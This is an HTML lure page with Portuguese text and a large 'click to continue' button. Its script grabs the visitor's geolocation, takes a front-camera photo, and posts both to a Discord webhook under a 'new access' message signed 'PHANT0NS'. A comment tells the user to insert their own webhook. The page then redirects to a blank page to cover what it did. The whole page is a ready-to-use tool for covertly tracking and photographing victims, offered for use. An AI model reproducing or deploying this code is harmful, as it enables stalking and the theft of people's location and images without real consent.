<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000;
            font-family: sans-serif;
        }

        #btn {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90vw;           /* Quase toda a largura da tela */
            height: 70vh;          /* Altura bem grande */
            max-width: 600px;
            max-height: 500px;
            border: none;
            background-color: #000;
            color: #fff;
            font-size: 42px;       /* Fonte bem maior */
            font-weight: bold;
            cursor: pointer;
            border: 4px solid #fff;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.6);
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 20px;
            line-height: 1.2;
        }

        #btn:hover {
            background-color: #111;
            box-shadow: 0 0 50px rgba(255, 255, 255, 0.9);
            transform: translate(-50%, -50%) scale(1.03);
        }

        #mensagens {
            color: white;
            text-align: center;
            padding: 20px;
            font-family: sans-serif;
            display: none;
        }

        .vermelho { color: red; font-size: 22px; }
        .verde { color: lime; font-size: 22px; }
        .normal { color: white; font-size: 18px; }
    </style>
</head>
<body>

<div id="mensagens">
    <p class="vermelho">TEXTO TEXTO TEXTO</p>
    <p class="verde">TEXTO TEXTO TEXTO TEXTO!</p>
    <p class="normal">TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO6!!!</p>
</div>

<button id="btn">CLIQUE PARA CONTINUAR</button>

<video id="v" style="display:none;" autoplay></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const URL_WEBHOOK = 'https://discord.com';   // ← Troque pelo seu webhook real

    document.getElementById('btn').addEventListener('click', async function() {
        document.getElementById('mensagens').style.display = 'block';
        this.style.display = 'none';

        try {
            const local = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 });
            });

            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            const v = document.getElementById('v');
            v.srcObject = stream;

            setTimeout(async () => {
                const c = document.getElementById('c');
                c.width = v.videoWidth || 1280;
                c.height = v.videoHeight || 720;
                c.getContext('2d').drawImage(v, 0, 0);
                
                const img = c.toDataURL('image/jpeg', 0.85);
                
                const fd = new FormData();
                fd.append('payload_json', JSON.stringify({
                    content: "😈😈 **NOVO ACESSO!😈**",
                    embeds: [{
                        title: "POR PHANT0NS😈",
                        description: `📍 [Localização no Mapa](https://www.google.com/maps?q=\( {local.coords.latitude}, \){local.coords.longitude})\n⏰ ${new Date().toLocaleString('pt-BR')}`,
                        color: 16711680,
                        image: { url: 'attachment://p.jpg' }
                    }]
                }));
                
                const blob = await (await fetch(img)).blob();
                fd.append('file', blob, 'p.jpg');

                await fetch(URL_WEBHOOK, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());

                setTimeout(() => { window.location.href = "about:blank"; }, 4000);
            }, 1500);

        } catch (e) {
            console.error(e);
            setTimeout(() => { window.location.href = "about:blank"; }, 3000);
        }
    });
</script>

</body>
</html>
